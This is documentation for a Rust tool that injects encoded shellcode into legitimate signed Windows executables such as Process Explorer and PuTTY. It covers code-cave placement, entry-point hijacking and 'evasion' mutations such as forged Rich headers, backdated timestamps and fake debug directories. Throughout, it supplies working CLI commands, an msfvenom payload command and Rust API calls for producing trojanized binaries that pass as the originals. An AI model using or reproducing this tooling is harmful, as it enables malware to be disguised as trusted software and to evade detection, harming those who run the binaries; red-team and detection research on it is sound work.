# PE Injection Build Path

Injects encoded shellcode into an existing legitimate Windows PE binary. The resulting artifact inherits the host PE's metadata, imports, and digital signature appearance, making it harder to distinguish from the original.

## Pipeline

```text
Target PE (e.g., procexp64.exe)
    -> Validate (MZ, PE32+, x64)
    -> Encode shellcode (XOR / SubByte / None)
    -> Build section data: [carrier_stub | key/metadata | encoded_payload]
    -> Place data (NewSection or CodeCave)
    -> Redirect execution (HeaderPatch or EpHijack)
    -> Recompute PE checksum
    -> (Optional) Apply binary mutations
    -> Validate output with goblin
    -> Write as <sha256>.exe
```

## Quick Start

### 1. Prepare Payload

Any raw shellcode `.bin` file works. For testing, you can generate one with `msfvenom` or use a simple NOP sled:

```bash
# Example: msfvenom calc payload
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin

# Or a minimal test payload (NOP + RET)
printf '\x90\xc3' > test.bin
```

### 2. Prepare Target PEs

Place legitimate x64 Windows `.exe` files in `data/injectables/`:

```
data/injectables/
    procexp64.exe       # Sysinternals Process Explorer
    notepad_copy.exe    # Copy of notepad.exe
    putty.exe           # PuTTY SSH client
```

Good target PEs are:
- **Signed x64 executables** (signature won't survive modification, but the PE structure looks legitimate)
- **Large binaries** (more natural file size after injection)
- **PEs with code caves** (padding between VirtualSize and SizeOfRawData in sections)

### 3. List Available Targets

Scan and evaluate all PEs in the injectables directory:

```bash
cargo run -p build --example pe_inject -- --list-targets
# or specify a custom directory:
cargo run -p build --example pe_inject -- --target-dir data/injectables --list-targets
```

Output:

```
Target                          Size      Cave   Hijack  Writable  Status
--------------------------------------------------------------------------------
procexp64.exe                  1.2 MB    4096      yes       yes  12 sections
notepad_copy.exe               200 KB     512      yes        no  6 sections
tiny_tool.exe                   48 KB       0       no        no  3 sections
broken.exe                      1 KB       -        -         -  INVALID: Missing MZ signature
```

| Column     | Meaning |
|------------|---------|
| **Cave**   | Largest code cave in bytes (zero-padded gap between VirtualSize and SizeOfRawData) |
| **Hijack** | Whether the EP function has a CALL/JMP suitable for patching |
| **Writable** | Whether any cave is in a writable section (preferred for XOR/SubByte in-place decode) |

### 4. Inject

#### Basic injection (explicit target)

```bash
cargo run -p build --example pe_inject -- \
    -p calc.bin \
    -t data/injectables/procexp64.exe \
    -o injected.exe
```

#### Auto-select best target

The injector scans the directory, evaluates each PE, and picks the best match for your payload size and modes:

```bash
cargo run -p build --example pe_inject -- \
    -p calc.bin \
    --target-dir data/injectables \
    -o injected.exe
```

Selection criteria (in order):
1. Must be valid PE32+ x64
2. CodeCave mode: cave must fit `stub + key + encoded_payload`
3. EpHijack mode: must have a hijackable CALL/JMP in EP function
4. XOR/SubByte + CodeCave: prefer targets with writable section caves
5. Tie-break: largest cave first, then largest file size

#### Stealth mode (code cave + EP hijack)

No new section added, no header EP change -- most evasive configuration:

```bash
cargo run -p build --example pe_inject -- \
    -p calc.bin \
    --target-dir data/injectables \
    --injection-mode cave \
    --redirect-mode hijack \
    --encoding none \
    -o stealth.exe
```

#### With binary mutations

Apply post-injection PE mutations for additional evasion:

```bash
cargo run -p build --example pe_inject -- \
    -p calc.bin \
    -t target.exe \
    -m binary.rich_header:donor=notepad \
    -m binary.timestamp:age_days=180 \
    -m binary.section_rename \
    -m binary.import_pad:count=50 \
    -o mutated.exe
```

## CLI Reference

```
USAGE:
    cargo run -p build --example pe_inject -- -p <PAYLOAD> -t <TARGET> [OPTIONS]
    cargo run -p build --example pe_inject -- -p <PAYLOAD> --target-dir <DIR> [OPTIONS]
    cargo run -p build --example pe_inject -- --target-dir <DIR> --list-targets
```

### Required (for injection)

| Flag | Description |
|------|-------------|
| `-p, --payload <FILE>` | Raw `.bin` shellcode payload |

### Target (one of)

| Flag | Description |
|------|-------------|
| `-t, --target <FILE>` | Specific host PE binary (x64 PE32+). Takes precedence over `--target-dir`. |
| `--target-dir <DIR>` | Directory of injectable PEs. Auto-selects best target for payload + mode. Defaults to `data/injectables` for `--list-targets`. |

### Options

| Flag | Default | Description |
|------|---------|-------------|
| `--list-targets` | - | Scan `--target-dir` and print suitability report, then exit |
| `-o, --output <FILE>` | - | Copy final artifact to this path |
| `--encoding <TYPE>` | `xor` | `xor`, `subbyte`, or `none`. `english` is not supported. |
| `--return-to-oep` | `false` | Jump back to original entry point after shellcode runs |
| `-m, --mutation <SPEC>` | - | Binary mutation (repeatable). See below. |
| `--output-dir <DIR>` | `./artifacts` | Build output directory |
| `--injection-mode <MODE>` | `section` | `section` (new section), `cave` (code cave), `split` (reserved) |
| `--redirect-mode <MODE>` | `header` | `header` (patch EP in PE header), `hijack` (patch CALL/JMP in EP function) |

### Binary Mutations

Applied after injection, before final write:

| Mutation | Parameters | Effect |
|----------|------------|--------|
| `binary.rich_header` | `donor=notepad\|calc\|explorer` | Inject MSVC Rich header |
| `binary.import_pad` | `count=50` | Add benign imports |
| `binary.resource_inject` | - | Add version info + manifest |
| `binary.section_rename` | - | Rename sections to MSVC defaults |
| `binary.timestamp` | `age_days=365` | Backdate PE timestamp |
| `binary.string_inject` | - | Add benign strings |
| `binary.entropy_normalize` | - | Low-entropy padding |
| `binary.size_pad` | - | Pad PE to target size |
| `binary.debug_dir` | - | Add fake PDB debug directory |

## Injection Modes

### NewSection (default)

Adds a new `.extra` section with RWX characteristics containing the carrier stub and encoded payload. The PE header's `AddressOfEntryPoint` is patched to point to the new section.

**Pros:** Always works, any payload size.
**Cons:** New section is visible in section count analysis; RWX is a static detection signal.

### CodeCave

Places the carrier stub and encoded payload into existing zero-padded gaps between a section's `VirtualSize` and `SizeOfRawData`. No new section header is added.

Falls back to NewSection if no cave is large enough.

**Pros:** No new section added, preserves original section count.
**Cons:** Limited by available cave size; may need to add MEM_WRITE to the section for XOR/SubByte decode.

### SplitCave (reserved)

Not yet implemented. Will split carrier (in `.text` cave) from payload (in `.rdata` cave).

## Redirect Modes

### HeaderPatch (default)

Overwrites `AddressOfEntryPoint` in the PE optional header to point to the injected carrier.

**Pros:** Simple, reliable.
**Cons:** Header EP change is easily detected by PE analysis tools.

### EpHijack

Disassembles the original entry point function and patches the first suitable `CALL` or `JMP` instruction (>= 5 bytes, skipping the first instruction) with a `JMP rel32` to the carrier.

Falls back to HeaderPatch if no suitable instruction is found.

**Pros:** Original EP header is unchanged; harder to detect with simple header analysis.
**Cons:** Requires a suitable branch instruction in the EP function.

## Encoding Types

| Type | Carrier Stub | Key Size | Payload Growth | Notes |
|------|:------------:|:--------:|:--------------:|-------|
| `xor` | XOR decode loop | 2 bytes | 1x | Default. In-place decode requires MEM_WRITE. |
| `subbyte` | Nibble-split decode | 256 bytes (reverse LUT) | 2x | Higher entropy resistance. In-place decode requires MEM_WRITE. |
| `none` | Direct call | 0 | 1x | No encoding. Payload runs as-is. Smallest stub. |

## Programmatic Usage (Rust API)

```rust
use build::pe_inject::*;
use build::EncodingType;

// Option A: Specific target
let config = PeInjectConfig {
    target_pe_path: Some("data/injectables/procexp64.exe".into()),
    injectables_dir: None,
    output_dir: "./artifacts".into(),
};

// Option B: Auto-select from directory
let config = PeInjectConfig {
    target_pe_path: None,
    injectables_dir: Some("data/injectables".into()),
    output_dir: "./artifacts".into(),
};

let injector = PeInjector::new(config)?;

let artifact = injector.inject(&PeInjectInput {
    payload: std::fs::read("shellcode.bin")?,
    encoding: EncodingType::Xor,
    binary_mutations: vec![],
    return_to_oep: false,
    injection_mode: InjectionMode::CodeCave,
    redirect_mode: RedirectMode::EpHijack,
})?;

println!("Output: {}", artifact.output_path.display());
println!("Target: {}", artifact.target_pe_name);
```

### Scanning API

```rust
use build::pe_inject::*;

// Scan a single PE
let info: TargetInfo = scan_target(Path::new("target.exe"));
if info.valid {
    println!("Cave: {} bytes in {:?}", info.largest_cave_bytes, info.largest_cave_section);
    println!("Hijackable: {}", info.has_hijack_site);
}

// Scan a directory (sorted by cave size descending)
let targets: Vec<TargetInfo> = scan_injectables_dir(Path::new("data/injectables"))?;

// Auto-select best target for a payload
let best: Option<&TargetInfo> = select_best_target(
    &targets,
    payload.len(),
    EncodingType::Xor,
    InjectionMode::CodeCave,
    RedirectMode::EpHijack,
);
```

## Output

A successful injection produces:

```
[pe_inject] --- Injection succeeded ---
[pe_inject] artifact_id:       a1b2c3d4...   (SHA256 of output PE)
[pe_inject] target_pe:         procexp64.exe
[pe_inject] size:              1253376 bytes
[pe_inject] output:            ./artifacts/a1b2c3d4....exe
[pe_inject] original EP:       0x12340
[pe_inject] injected section:  0x1a000
[pe_inject] injection mode:    CodeCave
[pe_inject] redirect mode:     EpHijack
[pe_inject] cave section:      .text
[pe_inject] mutations:         ["binary.rich_header", "binary.timestamp"]
```

## Tests

```bash
# Run all pe_inject tests (53 tests)
cargo test -p build --lib -- pe_inject
```
